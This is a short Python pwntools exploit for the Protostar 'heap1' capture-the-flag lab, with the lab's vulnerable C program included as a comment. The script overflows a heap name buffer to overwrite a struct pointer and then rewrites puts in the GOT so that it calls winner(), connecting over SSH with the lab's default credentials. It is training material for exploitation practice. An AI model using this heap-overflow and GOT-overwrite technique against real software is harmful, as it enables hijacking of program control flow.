'''
Source:
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
'''

from pwn import *

elf = context.binary = ELF('heap1')
BINPATH = '/opt/protostar/bin/heap1'

if args.REMOTE:
    p = ssh(host='protostar',\
            user='user',\
            password='user')

winner = p32(elf.symbols.winner)
success(f'Winner is located at {hex(elf.symbols.winner)}')

# GOT has the location of puts
puts = p32(elf.got.puts)
success(f'Puts located at GOT: {hex(elf.got.puts)}')

# Each struct has [chunk_info(8)][int(4)][char*(4)][char(8)]
# We write from the first char location: 8 + 8 + 4 = 20 bytes to begin i2 char* overwrite
# Overwrite puts in GOT to call winner function

arg1 = b'A' * 20 + puts
arg2 = winner

if args.REMOTE:
    info(p.run_to_end(f'{BINPATH} {arg1} {arg2}')[0].decode())
else:
    info(process(['./heap1', arg1, arg2]).recvall(timeout=1).decode())
